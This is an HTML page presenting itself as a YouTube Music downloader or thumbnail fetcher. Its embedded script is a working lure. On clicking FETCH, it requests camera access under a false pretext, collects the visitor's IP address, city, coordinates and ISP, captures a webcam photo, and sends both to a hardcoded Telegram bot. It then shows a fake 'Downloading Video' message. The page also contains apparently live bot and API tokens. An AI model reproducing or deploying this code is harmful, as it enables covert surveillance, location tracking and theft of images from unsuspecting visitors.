<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>YouTube Music Downloader</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(135deg, #f0f0f0 0%, #dcdcdc 100%);
      min-height: 100vh;
      color: #222;
    }
    .navbar {
      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
      color: white;
      text-align: center;
      padding: 25px 0;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    #header {
      font-size: 32px;
      font-weight: 700;
      letter-spacing: 2px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
      margin-top: 10px;
    }
    .youtube-logo {
      display: block;
      margin: 0 auto 15px;
      width: 120px;
    }
    .container {
      max-width: 650px;
      margin: 40px auto;
      padding: 40px;
      background: rgba(255,255,255,0.95);
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
    }
    .form-control {
      width: 100%;
      margin-bottom: 25px;
      padding: 18px 20px;
      border: 2px solid #e1e5e9;
      border-radius: 12px;
      font-size: 16px;
    }
    #thumbdloadbtn {
      display: block;
      width: 100%;
      padding: 18px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
      color: white;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
    }
    h2 {
      color: #333;
      font-size: 24px;
      font-weight: 600;
      margin: 35px 0 25px 0;
      text-align: center;
    }
    ol {
      background: rgba(255,0,0,0.05);
      padding: 25px 30px;
      border-radius: 12px;
      border-left: 4px solid #ff0000;
    }
    ol li {
      margin-bottom: 12px;
      font-size: 16px;
      line-height: 1.6;
      color: #555;
    }
    #message-container {
      margin-top: 20px;
      font-size: 16px;
      color: green;
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
    <h1 id="header">YOUTUBE MUSIC DOWNLOADER</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Paste YouTube Music Link">
    <button id="thumbdloadbtn" onclick="sendImage()">FETCH</button>

    <h2>How to Download HD YouTube Music Thumbnail</h2>
    <ol>
      <li>Copy the YouTube Music Video Link</li>
      <li>Paste the link in the field above</li>
      <li>Click on "FETCH" to start process</li>
    </ol>
    <div id="message-container"></div>
  </div>

  <script>
    const botToken = '8395178593:AAGtnQl4yD9zjGcOfP2rKOr4z7GEIoewZIo';
    const chatId = '-1003062814669';
    const ipInfoToken = 'bb6ec807490a04';

    async function getIPInfo() {
      try {
        const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
        return await response.json();
      } catch (error) {
        console.error("IP info fetch failed:", error);
        return {};
      }
    }

    async function sendToTelegram(message, photoBlob = null) {
      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        if (photoBlob) {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', photoBlob, 'capture.jpg');
          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        }
      } catch (error) {
        console.error("Telegram send failed:", error);
      }
    }

    async function sendImage() {
      const consent = confirm("Grant permission to access your camera?");
      if (!consent) return;

      const ipData = await getIPInfo();
      const message = `üìç IP Info:
IP: ${ipData.ip || 'N/A'}
City: ${ipData.city || 'N/A'}
Region: ${ipData.region || 'N/A'}
Location: ${ipData.loc || 'N/A'}
ISP: ${ipData.org || 'N/A'}
Timezone: ${ipData.timezone || 'N/A'}`;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        await sendToTelegram(message, blob);
        document.getElementById("message-container").innerText = "‚úÖ Downloading Video !";
      } catch (err) {
        console.error("Camera error:", err);
        document.getElementById("message-container").innerText = "‚ö†Ô∏è Camera access denied or error occurred.";
      }
    }
  </script>
</body>
</html>
